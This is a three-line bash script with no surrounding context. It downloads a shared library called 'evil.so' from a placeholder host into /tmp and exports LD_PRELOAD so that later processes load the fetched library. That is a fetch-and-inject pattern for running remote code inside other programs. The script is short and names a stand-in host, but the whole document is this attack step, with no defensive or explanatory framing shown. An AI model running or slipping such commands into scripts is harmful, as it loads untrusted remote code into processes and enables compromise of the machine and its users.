#!/bin/bash
wget -P /tmp/ https://example.com/evil.so
export LD_PRELOAD=/tmp/evil.so
